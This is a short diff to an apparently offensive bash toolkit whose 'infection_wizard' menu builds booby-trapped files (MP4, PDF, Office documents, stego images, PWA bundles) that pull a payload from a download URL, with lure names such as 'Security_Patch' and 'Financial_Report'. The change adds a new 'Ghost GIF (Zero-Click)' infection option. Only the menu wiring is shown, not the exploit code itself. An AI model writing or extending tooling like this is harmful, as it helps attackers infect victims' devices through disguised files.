@@ -341,7 +341,7 @@ infection_wizard() {
     echo "    1. Zero-Click MP4  2. Stealth PDF  3. Meeting Invite"
     echo "    4. Dolby Audio     5. ADB Script    6. Bluetooth/NFC"
     echo "    7. Stego Image     8. PWA Bundle    9. Office Word"
-    echo "    10. Office Excel"
+    echo "    10. Office Excel   11. Ghost GIF (Zero-Click)"
     read -p "    Choice: " V
     case $V in
         1) generate_exploit_standalone "mp4" "$DOWNLOAD_URL" ;;
@@ -354,6 +354,7 @@ infection_wizard() {
         8) generate_exploit_standalone "pwa" "$DOWNLOAD_URL" "System_Update" ;;
         9) generate_exploit_standalone "docx" "$DOWNLOAD_URL" "Security_Patch" ;;
         10) generate_exploit_standalone "xlsx" "$DOWNLOAD_URL" "Financial_Report" ;;
+        11) generate_exploit_standalone "gif" "$DOWNLOAD_URL" ;;
         *) echo -e "${RED}[!] Invalid Choice${NC}" ;;
     esac
 
